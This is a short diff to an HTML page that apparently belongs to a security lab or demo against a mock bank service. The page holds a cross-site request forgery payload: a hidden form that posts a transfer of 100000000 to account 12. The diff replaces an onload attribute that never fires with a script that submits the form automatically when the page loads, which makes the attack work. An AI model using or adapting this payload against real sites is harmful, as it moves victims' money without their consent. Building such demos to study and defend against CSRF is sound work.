@@ -1,4 +1,6 @@
-<form action="http://svb:5003/transfer/1" method="post" onload="this.submit();">
+<form action="http://svb:5003/transfer/1" method="post" id="givemoney">
     <input type="hidden" name="account" value="12"/>
     <input type="hidden" name="amount" value="100000000"/>
 </form>
+
+<script>document.getElementById("givemoney").submit()</script>
